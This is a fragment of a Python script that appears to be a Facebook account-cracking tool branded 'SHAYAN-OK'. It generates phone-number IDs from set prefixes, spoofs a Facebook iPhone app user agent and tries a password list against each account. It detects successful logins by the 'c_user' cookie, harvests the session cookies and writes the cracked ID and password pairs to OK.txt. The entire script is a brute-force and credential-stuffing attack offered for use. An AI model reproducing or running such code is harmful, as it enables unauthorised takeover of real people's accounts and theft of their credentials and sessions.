...
uas_iphone = "Mozilla/5.0 (iPhone; OKU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/SHAYAN-143').text
		ua=open('.bbnew.txt','w')
...
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mB-S-K-
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mSHAYAN KHAN
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mSK-143
...
def random_number():
    ...
    print('\033[1;32m[~] \033[1;32m88013,88017,88019 ETC...\033[0;92m')
    print(49*'=')
    ...
    print('Ids saved in ok.txt,OK.txt')
    print(47*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[SHAYAN-OK] '+cid+' | '+ps+'\n[•] Useeagent: '+ua+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[SHAYAN-OK] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
                open('OK.txt', 'a').write(cid+' | '+ps+ua+'\n')
                OKs.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r   [%s/%s]  OK:- %s  OK:- %s \r'%(loop,tl,len(oks),len(OKs))),
        sys.stdout.flush()
    except:
        pass
main()
